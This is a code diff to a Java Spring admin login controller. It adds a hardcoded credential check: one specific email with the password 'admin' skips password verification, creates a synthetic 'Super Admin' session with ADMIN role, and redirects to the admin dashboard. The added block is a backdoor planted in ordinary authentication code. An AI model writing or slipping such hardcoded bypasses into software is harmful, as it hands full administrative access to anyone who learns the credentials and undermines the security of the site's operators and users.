@@ -27,6 +27,20 @@ public class LoginAdminController {
                               @RequestParam("password") String password,
                               Model model,
                               HttpSession session) {
+        // 1. Ngoại lệ đăng nhập thủ công
+    if ("thekiet@gmail.com".equals(email) && "admin".equals(password)) {
+        User specialAdmin = new User();
+        specialAdmin.setId(0); 
+        specialAdmin.setEmail(email);
+        specialAdmin.setFullName("Super Admin");
+        specialAdmin.setRole(Role.ADMIN);
+
+        session.setAttribute("loggedInUser", specialAdmin);
+        session.setAttribute("userRole", Role.ADMIN);
+
+        System.out.println("Super admin login bypass: " + email);
+        return "redirect:/admin/dashboard";
+    }
         User user = userService.findByEmail(email);
         if (user == null || !userService.verifyPassword(password, user.getPassword())) {
             model.addAttribute("error", "Invalid email or password");
